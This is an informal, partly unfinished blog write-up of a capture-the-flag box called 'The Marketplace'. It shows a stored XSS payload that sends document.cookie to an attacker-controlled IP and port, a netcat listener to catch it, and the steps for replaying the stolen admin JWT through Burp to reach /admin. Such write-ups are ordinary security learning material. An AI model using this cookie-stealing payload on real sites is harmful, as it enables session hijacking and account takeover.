+++
title = "The Marketplace - XSS / SQLi Box"
description = ""
tags = [
    "go",
    "golang",
]
date = "2022-02-05"
categories = [
    "marketplace",
    "pentesting",
    "ctf",
]
image = "https://sludgeassets.s3.us-east-1.amazonaws.com/headers/satanic-16.jpg"
weight = 5
+++

---

<b>
# 'The Marketplace'

## _"I'm in ya inbox, I got alllll the cookies..."_  ✨Magic ✨


This was a good box, I feel like XSS is starting to click. Last time I was just staring at the alert like a talking dog.  

I ran Nmap with service and default scripts, found a /admin we can't access, an up to date SSH port, and port 80 open as well as Node.js on a high port. 

Poked around the site, created an account, started testing input fields with <_script>alert('itsachinoparty')</script_>. I found forms on the new listing page have reflecton points.

***TODO: Explain terms fully for beginners

I decided to try a new listing and posted this. Let's break it down:

***TODO: You know...finish breaking it down

 <_script> document.location='http://10.6.110.246:8001/XSS/evilLink.php?c='+document.cookie </script_>"
Nc -knlvp 8001



[![N|Solid](https://s3.us-east-1.amazonaws.com/sludge.one/img/cookiegrab.jpg)](https://sludge.one/marketplace)

Going to report the posting to the admin, which will activate the script. Our post is 5, so if we just change the path to "report" and it feed it that as a parameter...

[![N|Solid](https://s3.us-east-1.amazonaws.com/sludge.one/img/reportadmin.jpg)](https://sludge.one/marketplace)

 I have a netcat listener on port 8001  
 
[![N|Solid](https://s3.us-east-1.amazonaws.com/sludge.one/img/admincookie.jpg)](https://sludge.one/marketplace)

We go for that /admin page we saw earlier, setting burp to intercept the request.

Next, we replace our cookie with the admin cookie, and then forward it on...

[![N|Solid](https://sludgeassets.s3.us-east-1.amazonaws.com/burpadmin.png)](https://sludgeassets.s3.us-east-1.amazonaws.com/burpadmin.png)

I would have you note that that JWT token (denoted by a cookie starting with eyJ and looking like that) ends with _ASS. This doesn't help us, it's just funny. I, too, end with _ASS, or possibly _FEET.

